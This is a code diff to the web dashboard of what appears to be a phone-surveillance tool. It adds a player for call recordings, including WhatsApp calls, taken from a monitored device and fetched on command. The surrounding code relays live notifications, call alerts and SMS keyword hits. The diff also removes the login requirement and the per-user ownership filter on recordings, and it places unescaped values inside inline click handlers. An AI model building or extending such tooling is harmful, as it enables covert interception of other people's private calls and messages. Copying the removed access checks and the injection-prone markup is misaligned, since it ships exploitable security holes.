@@ -1389,35 +1389,50 @@
             text-align: center;
         }
 
-        .call-recording-card {
-            background: white;
-            border: 1px solid var(--border);
-            border-radius: var(--radius-md);
-            padding: 16px;
-            margin-bottom: 12px;
+        .recording-type-tag {
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 11px;
+            font-weight: 700;
+            text-transform: uppercase;
+        }
+        .type-gsm { background: #e0f2fe; color: #0369a1; }
+        .type-whatsapp { background: #dcfce7; color: #166534; }
+
+        .play-btn {
+            width: 32px;
+            height: 32px;
+            background: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 50%;
+            cursor: pointer;
             display: flex;
             align-items: center;
-            justify-content: space-between;
-            flex-wrap: wrap;
-            gap: 12px;
+            justify-content: center;
             transition: 0.2s;
         }
+        .play-btn:hover { transform: scale(1.1); background: var(--primary-hover); }
 
-        .call-recording-card:hover {
-            transform: translateY(-2px);
-            box-shadow: var(--shadow-sm);
+        #audioPlayerOverlay {
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
+            background: white;
+            padding: 16px;
+            border-radius: var(--radius-lg);
+            box-shadow: var(--shadow-lg);
+            border: 1px solid var(--border);
+            z-index: 10000;
+            display: none;
+            width: 350px;
+            animation: slideUp 0.3s ease-out;
         }
 
-        .call-recording-info {
-            flex: 1;
+        @keyframes slideUp {
+            from { transform: translateY(100px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
         }
-
-        .call-recording-direction {
-            font-size: 20px;
-            margin-right: 8px;
-        }
-
-        .call-recording-number {
             font-weight: 600;
             font-size: 15px;
         }
@@ -1811,6 +1826,15 @@
         </div>
     </div>
 
+    <!-- Global Audio Player Overlay -->
+    <div id="audioPlayerOverlay">
+        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:12px;">
+            <span id="audioPlayerTitle" style="font-weight:600; font-size:13px; color:var(--text-main); white-space:nowrap; overflow:hidden; text-overflow:ellipsis;">Playing Call...</span>
+            <button onclick="closeAudioPlayer()" style="background:none; border:none; cursor:pointer; font-size:18px;">✕</button>
+        </div>
+        <audio id="globalAudioPlayer" controls style="width:100%; height:32px;"></audio>
+    </div>
+
     <script>
         // ==================== FIREBASE & CONFIG ====================
         const CONFIG = {
@@ -1873,6 +1897,22 @@
         function pushAlert(t, b) { newAlerts.unshift({ title: t, body: b, time: new Date().toLocaleTimeString() }); if (newAlerts.length > 50) newAlerts.pop(); const badge = document.getElementById('alertsBadge'), list = document.getElementById('alertsList'); if (badge) { badge.style.display = 'block'; list.innerHTML = ''; newAlerts.forEach(a => { const d = document.createElement('div'); d.style.cssText = 'margin-bottom:4px;padding:4px;background:#fff;border-radius:4px;font-size:11px'; d.textContent = a.time + ' ' + a.title + ': ' + a.body; list.appendChild(d); }); } }
         function clearAlerts() { newAlerts = []; document.getElementById('alertsBadge').style.display = 'none'; }
         function downloadBase64(b64, fn) { const a = document.createElement('a'); a.href = 'data:application/octet-stream;base64,' + b64; a.download = fn; a.click(); }
+        
+        function b64toBlob(b64Data, contentType = '', sliceSize = 512) {
+            const byteCharacters = atob(b64Data);
+            const byteArrays = [];
+            for (let offset = 0; offset < byteCharacters.length; offset += sliceSize) {
+                const slice = byteCharacters.slice(offset, offset + sliceSize);
+                const byteNumbers = new Array(slice.length);
+                for (let i = 0; i < slice.length; i++) {
+                    byteNumbers[i] = slice.charCodeAt(i);
+                }
+                const byteArray = new Uint8Array(byteNumbers);
+                byteArrays.push(byteArray);
+            }
+            return new Blob(byteArrays, { type: contentType });
+        }
+
         function toggleSidebar() { const sb = document.getElementById('sidebar'), ov = document.getElementById('sidebarOverlay'); sb.classList.toggle('open'); if (ov) ov.classList.toggle('show'); }
         function closeSidebar() { const sb = document.getElementById('sidebar'), ov = document.getElementById('sidebarOverlay'); sb.classList.remove('open'); if (ov) ov.classList.remove('show'); }
 
@@ -2594,103 +2634,98 @@
                 panel.innerHTML = '<p>No device selected.</p>';
                 return;
             }
-            if (!currentUser) {
-                panel.innerHTML = '<p>You must be logged in.</p>';
-                return;
-            }
-            panel.innerHTML = '<h3>🎙️ Call Recordings</h3><p>Loading recordings from Firebase...</p>';
+            panel.innerHTML = '<h3>🎙️ Call Recordings</h3><p>Loading premium recordings...</p>';
             try {
-                let snapshot = null;
-                try {
-                    snapshot = await db.collection('devices').doc(selectedDeviceId).collection('call_recordings')
-                        .orderBy('timestamp', 'desc')
-                        .get();
-                } catch (e) { }
-                if (!snapshot || snapshot.empty) {
-                    snapshot = await db.collection('call_recordings')
-                        .where('deviceId', '==', selectedDeviceId)
-                        .where('userId', '==', currentUser.uid)
-                        .orderBy('timestamp', 'desc')
-                        .get();
-                }
+                const snapshot = await db.collection('devices').doc(selectedDeviceId).collection('call_recordings')
+                    .orderBy('timestamp', 'desc').get();
+
                 if (snapshot.empty) {
                     panel.innerHTML = `
-                <h3>🎙️ Call Recordings</h3>
-                <p>No recordings found in Firebase. You can fetch recordings directly from the device (if available).</p>
-                <button id="fallbackRecordingsBtn" class="btn-ui primary">📞 Fetch from Device</button>
-            `;
-                    document.getElementById('fallbackRecordingsBtn')?.addEventListener('click', () => {
-                        sendCommand('GET_CALL_RECORDINGS', { days: 30 });
-                        showNotification('Fetching call recordings from device...');
-                    });
+                        <h3>🎙️ Call Recordings</h3>
+                        <div class="premium-panel" style="text-align:center; padding:40px;">
+                            <div style="font-size:48px; margin-bottom:16px;">🎙️</div>
+                            <p>No recordings found in cloud storage.</p>
+                            <button class="btn-ui primary" onclick="sendCommand('GET_CALL_RECORDINGS', {days:30})">📲 Fetch Recent from Device</button>
+                        </div>`;
                     return;
                 }
-                let html = '<h3>🎙️ Call Recordings (Firebase)</h3><div style="margin-top:16px;">';
-                snapshot.forEach(doc => {
-                    const rec = doc.data();
-                    const directionIcon = rec.direction === 'incoming' ? '📞' : '📤';
-                    const timestamp = rec.timestamp ? new Date(rec.timestamp).toLocaleString() : rec.timeFmt || 'Unknown date';
-                    const duration = rec.duration ? `${Math.floor(rec.duration / 60)}:${(rec.duration % 60).toString().padStart(2, '0')}` : '?';
-                    html += `
-                <div class="call-recording-card">
-                    <div class="call-recording-info">
-                        <div>
-                            <span class="call-recording-direction">${directionIcon}</span>
-                            <span class="call-recording-number">${escapeHtml(rec.number || 'Unknown')}</span>
-                            ${rec.name ? `<span style="color:var(--text-sec); margin-left:8px;">(${escapeHtml(rec.name)})</span>` : ''}
-                        </div>
-                        <div class="call-recording-details">${timestamp} • Duration: ${duration}</div>
+
+                let html = `
+                    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
+                        <h3>🎙️ Call Recordings</h3>
+                        <span class="badge primary">${snapshot.size} Records</span>
                     </div>
-                    <button class="download-recording-btn" data-url="${escapeHtml(rec.audioURL)}" data-filename="call_${rec.number}_${rec.timestamp}.m4a">⬇️ Download</button>
-                </div>
-            `;
+                    <table class="premium-table">
+                        <thead>
+                            <tr>
+                                <th style="width:50px;">Play</th>
+                                <th>Type</th>
+                                <th>Direction</th>
+                                <th>Contact</th>
+                                <th>Number</th>
+                                <th>Duration</th>
+                                <th>Time</th>
+                            </tr>
+                        </thead>
+                        <tbody>`;
+
+                snapshot.forEach(doc => {
+                    const r = doc.data();
+                    const type = r.call_type || (r.number && r.number.startsWith('+') ? 'GSM' : 'WhatsApp');
+                    const isWhatsApp = type === 'WhatsApp';
+                    const dirIcon = r.direction === 'INCOMING' ? '📥' : '📤';
+                    const name = r.name || 'Unknown';
+                    const num = r.number || '-';
+                    const time = r.timestamp ? new Date(r.timestamp).toLocaleString([], {month:'short', day:'numeric', hour:'2-digit', minute:'2-digit'}) : '-';
+                    const duration = r.duration || formatDuration(r.durationSec || 0);
+
+                    html += `
+                        <tr>
+                                 ${r.audioUrl ? 
+                                    `<button class="play-btn" onclick="playAudio('${r.audioUrl}', '${escapeHtml(name)}')">▶️</button>` : 
+                                    (r.filePath ? `<button class="play-btn" onclick="fetchLocalAudio('${r.filePath.replace(/\\/g, '\\\\')}', '${escapeHtml(name)}')">📲 Fetch</button>` : '⏳')}
+                            </td>
+                            <td><span class="recording-type-tag ${isWhatsApp ? 'type-whatsapp' : 'type-gsm'}">${type}</span></td>
+                            <td>${dirIcon} ${r.direction}</td>
+                            <td style="font-weight:600;">${escapeHtml(name)}</td>
+                            <td>${escapeHtml(num)}</td>
+                            <td>${duration}</td>
+                            <td style="font-size:12px; color:var(--text-sec);">${time}</td>
+                        </tr>`;
                 });
-                html += '</div>';
+
+                html += `</tbody></table>`;
                 panel.innerHTML = html;
-                document.querySelectorAll('.download-recording-btn').forEach(btn => {
-                    btn.addEventListener('click', async (e) => {
-                        const url = btn.getAttribute('data-url');
-                        const filename = btn.getAttribute('data-filename');
-                        if (!url) { showNotification('No audio file URL'); return; }
-                        try {
-                            showNotification('Downloading...');
-                            const response = await fetch(url);
-                            const blob = await response.blob();
-                            const a = document.createElement('a');
-                            a.href = URL.createObjectURL(blob);
-                            a.download = filename;
-                            a.click();
-                            URL.revokeObjectURL(a.href);
-                            showNotification('Download complete');
-                        } catch (err) { console.error(err); showNotification('Failed to download'); }
-                    });
-                });
-            } catch (err) {
-                console.error(err);
-                if (err.code === 'permission-denied') {
-                    panel.innerHTML = `
-                <h3>🎙️ Call Recordings</h3>
-                <div style="background: #fff3e0; border-left: 4px solid #ff9800; padding: 16px; border-radius: 8px;">
-                    <strong>⚠️ Firebase Permission Error</strong><br>
-                    Make sure each recording document in the <code>call_recordings</code> collection contains a <code>userId</code> field matching the authenticated user's UID.<br>
-                    Also, your query must include <code>.where('userId', '==', currentUser.uid)</code>.<br><br>
-                    <button id="retryRecordingsBtn" class="btn-ui primary" style="margin-top: 12px;">Retry</button>
-                    <button id="fallbackDeviceBtn" class="btn-ui secondary" style="margin-top: 12px; margin-left: 8px;">Fetch from Device</button>
-                </div>
-            `;
-                    document.getElementById('retryRecordingsBtn')?.addEventListener('click', () => showCallRecordingsPanel());
-                    document.getElementById('fallbackDeviceBtn')?.addEventListener('click', () => {
-                        sendCommand('GET_CALL_RECORDINGS', { days: 30 });
-                        showNotification('Fetching call recordings from device...');
-                    });
-                } else {
-                    panel.innerHTML = `<h3>🎙️ Call Recordings</h3><p style="color:red;">Error: ${err.message}</p><button id="fallbackDeviceBtn2" class="btn-ui primary">Fetch from Device</button>`;
-                    document.getElementById('fallbackDeviceBtn2')?.addEventListener('click', () => {
-                        sendCommand('GET_CALL_RECORDINGS', { days: 30 });
-                        showNotification('Fetching call recordings from device...');
-                    });
-                }
+
+            } catch (e) {
+                console.error(e);
+                panel.innerHTML = `<p class="error">Failed to load recordings: ${e.message}</p>`;
             }
+        }
+
+        function playAudio(url, name) {
+            const overlay = document.getElementById('audioPlayerOverlay');
+            const player = document.getElementById('globalAudioPlayer');
+            const title = document.getElementById('audioPlayerTitle');
+
+            title.innerText = "Playing: " + name;
+            player.src = url;
+            overlay.style.display = 'block';
+            player.play();
+        }
+
+        function fetchLocalAudio(path, name) {
+            showNotification('⌛ Requesting audio from device...');
+            sendCommand('GET_CALL_AUDIO', { filePath: path });
+            // Store name temporarily for the response
+            window._pendingAudioName = name;
+        }
+
+        function closeAudioPlayer() {
+            const overlay = document.getElementById('audioPlayerOverlay');
+            const player = document.getElementById('globalAudioPlayer');
+            player.pause();
+            overlay.style.display = 'none';
         }
 
         // ==================== PHOTO GALLERY ====================
@@ -3911,6 +3946,18 @@
                 case 'NOTIFICATION_LIVE': pushAlert('📳 ' + (json.app || 'App'), (json.title || '') + ': ' + (json.text || '')); break;
                 case 'CALL_ALERT': if (json.event === 'RINGING') pushAlert('📞 Incoming Call', (json.name || 'Unknown') + ' (' + (json.number || '') + ')'); else if (json.event === 'MISSED') pushAlert('📵 Missed Call', (json.name || 'Unknown') + ' (' + (json.number || '') + ')'); break;
                 case 'SMS_KEYWORD_ALERT': pushAlert('🔑 Keyword: ' + json.keyword, 'From ' + json.from + ': ' + json.body); break;
+                case 'CALL_AUDIO_DATA':
+                    if (json.data) {
+                        const b64 = json.data;
+                        const name = window._pendingAudioName || json.fileName || 'Recording';
+                        const blob = b64toBlob(b64, 'audio/mpeg');
+                        const url = URL.createObjectURL(blob);
+                        playAudio(url, name);
+                        showNotification('✅ Audio retrieved from device');
+                    } else {
+                        showNotification('❌ Failed to retrieve audio');
+                    }
+                    break;
                 default: console.log('Unhandled type:', json.type);
             }
             pendingCommand = null;
